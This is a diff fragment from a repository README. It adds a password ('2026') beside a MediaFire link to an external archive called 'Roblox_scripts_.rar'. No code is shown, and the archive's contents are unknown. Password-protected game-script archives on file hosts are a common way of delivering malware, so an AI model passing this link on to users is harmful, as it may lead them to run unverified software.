@@ -30,7 +30,7 @@ The main files are available in this repository.
 Additional resources can be downloaded here:
 
 External archive:
-https://www.mediafire.com/file/vzqpyfncmpwym22/Roblox_scripts_.rar/file
+https://www.mediafire.com/file/vzqpyfncmpwym22/Roblox_scripts_.rar/file   password 2026
 
 License
 
